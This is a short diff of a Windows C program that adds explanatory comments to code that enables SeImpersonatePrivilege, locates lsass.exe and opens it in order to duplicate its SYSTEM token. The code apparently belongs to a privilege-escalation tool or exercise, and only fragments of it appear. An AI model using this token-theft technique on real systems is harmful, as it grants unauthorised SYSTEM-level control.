@@ -33,6 +33,8 @@ int main(int argc, char** argv)
 	HANDLE currentTokenHandle = NULL;
 	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
 	
+	// see if we have the required privileges and enable them
+	//
 	if (SetPrivilege(currentTokenHandle, "SeImpersonatePrivilege", TRUE))
 	{
 		printf("[+] SeImpersonatePrivilege enabled!\n");
@@ -55,10 +57,12 @@ int main(int argc, char** argv)
 		return 1;
 	}
 	
+	// lsass.exe runs with a SYSTEM token, we find the PID of lsass.exe
+	//
 	char* processName = "lsass.exe";
 	int PID = FindTarget(processName);
 	
-	// We open the process to retrieve information about the process (specifically the token).
+	// We open the process to retrieve information about the process (specifically we want to duplicate the token).
 	//
 	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, PID);
 	
